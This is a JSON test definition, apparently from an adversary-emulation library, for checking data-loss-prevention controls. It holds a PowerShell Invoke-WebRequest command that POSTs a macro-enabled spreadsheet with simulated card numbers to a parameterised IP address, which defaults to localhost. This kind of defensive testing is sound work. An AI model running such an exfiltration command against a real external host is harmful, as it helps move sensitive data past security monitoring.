{
  "id": "e2d85e66-cb66-4ed7-93b1-833fc56c9319",
  "name": "DLP Evasion via Sensitive Data in VBA Macro over HTTP",
  "description": "Upon successful execution, an excel containing VBA Macro containing sensitive data will be sent outside the network using HTTP.\nSensitive data includes about around 20 odd simulated credit card numbers that passes the LUHN check.\n",
  "platforms": [
    "windows"
  ],
  "steps": [
    {
      "id": "54d4f5fa-1610-4ec9-98a2-c9417c5f4685",
      "type": "execute-command",
      "data": {
        "command": "Invoke-WebRequest -Uri #{ip_address} -Method POST -Body \"#{input_file}\"\n",
        "command_type": "powershell"
      },
      "elevation_required": false
    }
  ],
  "tags": [
    "T1027",
    "atomic-red-team"
  ],
  "input_arguments": [
    {
      "name": "ip_address",
      "type": "string",
      "description": "Destination IP address",
      "value": "127.0.0.1"
    },
    {
      "name": "input_file",
      "type": "path",
      "description": "Path of the XLSM file",
      "value": "PathToAtomicsFolder\\T1027\\src\\T1027-cc-macro.xlsm"
    }
  ]
}